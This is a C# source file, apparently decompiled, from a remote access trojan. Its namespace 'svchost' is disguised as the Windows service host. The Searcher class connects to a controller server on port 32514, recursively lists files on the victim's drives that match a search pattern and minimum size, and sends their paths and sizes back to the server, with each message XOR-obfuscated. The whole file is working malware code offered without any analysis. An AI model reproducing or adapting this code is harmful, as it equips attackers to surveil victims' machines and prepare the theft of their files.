using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace svchost;

public class Searcher
{
	public static string Params;

	private TcpClient SearchClient;

	private NetworkStream SearchStream;

	private byte[] SendBytes;

	private bool Serror;

	public Searcher()
	{
		SearchClient = new TcpClient();
	}

	public void Search()
	{
		Thread.Sleep(1000);
		Application.DoEvents();
		checked
		{
			try
			{
				SearchClient.Connect(Form1.ServerIP, 32514);
				SearchStream = SearchClient.GetStream();
				Params = Params.Replace("Search\u0002", "");
				string text = Params.Substring(0, Strings.InStr(Params, "\u0002", (CompareMethod)0) - 1);
				string text2 = Params.Replace(text + "\u0002", "");
				string text3 = text2;
				text2 = text2.Substring(0, Strings.InStr(text2, "\u0002", (CompareMethod)0) - 1);
				text3 = text3.Replace(text2 + "\u0002", "");
				SendMessage("F.INF.F\u0002" + text + "\u0002" + "\n");
				if (Serror)
				{
					return;
				}
				string[] files = Directory.GetFiles(text, text2);
				foreach (string text4 in files)
				{
					try
					{
						if (StringType.StrCmp(text3, "N/A", false) == 0)
						{
							SendMessage(text4 + "\u0002" + StringType.FromLong(FileSystem.FileLen(text4)) + "\u0002" + "\n");
						}
						else if ((double)FileSystem.FileLen(text4) > Conversion.Val(text3) * 1000.0)
						{
							SendMessage(text4 + "\u0002" + StringType.FromLong(FileSystem.FileLen(text4)) + "\u0002" + "\n");
						}
						if (Serror)
						{
							return;
						}
						Application.DoEvents();
						Thread.Sleep(5);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				DirSearch(text, text2, text3);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				SendMessage("\u0004");
				SearchClient.Close();
				SearchStream.Close();
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void DirSearch(string DrivetoSearch, string TexttoSearch, string MinFileSize)
	{
		if (Serror)
		{
			return;
		}
		try
		{
			bool flag = default(bool);
			if (Strings.InStr(DrivetoSearch, "Temporary Internet Files", (CompareMethod)0) != 0)
			{
				flag = true;
			}
			if (Strings.InStr(DrivetoSearch, "\\sims\\UserData", (CompareMethod)0) != 0)
			{
				flag = true;
			}
			if (flag)
			{
				flag = false;
				return;
			}
			string[] directories = Directory.GetDirectories(DrivetoSearch);
			foreach (string text in directories)
			{
				try
				{
					SendMessage("F.INF.F\u0002" + text + "\u0002" + "\n");
					if (Serror)
					{
						break;
					}
					string[] files = Directory.GetFiles(text, TexttoSearch);
					foreach (string text2 in files)
					{
						try
						{
							if (StringType.StrCmp(MinFileSize, "N/A", false) == 0)
							{
								SendMessage(text2 + "\u0002" + StringType.FromLong(FileSystem.FileLen(text2)) + "\u0002" + "\n");
							}
							else if ((double)FileSystem.FileLen(text2) > Conversion.Val(MinFileSize) * 1000.0)
							{
								SendMessage(text2 + "\u0002" + StringType.FromLong(FileSystem.FileLen(text2)) + "\u0002" + "\n");
							}
							if (Serror)
							{
								return;
							}
							Thread.Sleep(5);
							Application.DoEvents();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
					}
					DirSearch(text, TexttoSearch, MinFileSize);
					Thread.Sleep(5);
					Application.DoEvents();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public void SendMessage(string Message)
	{
		checked
		{
			try
			{
				if (StringType.StrCmp(Message, "", false) != 0)
				{
					Message = "\u0001\u0002" + Message;
					Message += "\u0003";
					int num = Message.Length - 1;
					string text = default(string);
					for (int i = 0; i <= num; i++)
					{
						text += StringType.FromChar(Strings.Chr(Strings.Asc(Message.Substring(i, 1)) ^ 0xFF));
					}
					SendBytes = Encoding.Default.GetBytes(text);
					SearchStream.Write(SendBytes, 0, SendBytes.Length);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Serror = true;
				try
				{
					SearchClient.Close();
					SearchStream.Close();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(5);
		}
	}
}
